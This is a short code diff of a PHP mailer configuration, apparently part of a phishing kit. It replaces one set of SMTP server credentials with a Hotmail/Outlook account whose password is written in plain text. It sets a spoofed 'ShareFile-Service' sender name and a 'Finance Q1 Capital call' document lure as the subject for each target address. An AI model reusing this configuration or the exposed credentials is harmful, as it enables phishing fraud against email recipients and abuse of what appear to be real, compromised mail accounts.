@@ -2,14 +2,14 @@
 
 ///////////////<- Start setup...
 //////// ----> SMTP info.
-$smtps = "mail.towne-pk.com";
-$nakedsmtpuser = "towne@towne-pk.com";
-$smtppass = "aleena5256b";
+$smtps = "smtp-mail.outlook.com";
+$nakedsmtpuser = "limengdi1989@hotmail.com";
+$smtppass = "Limengdi8612185.";
 $smtpauth = true;
-$smtpport = 25;
+$smtpport = 587;
 
 /////// ---> Headers info.
-$nakedfrom = "towne@towne-pk.com";
+$nakedfrom = "limengdi1989@hotmail.com";
 $nakedname = "[{random4}] {frmsite}ShareFile-Service";
 $nakedsubject = '[{time}] : Shared - Document : "{frmsite} Finance Q1 Capital call pre-Request.doc for {email}" - ';
 $Priority = 1;
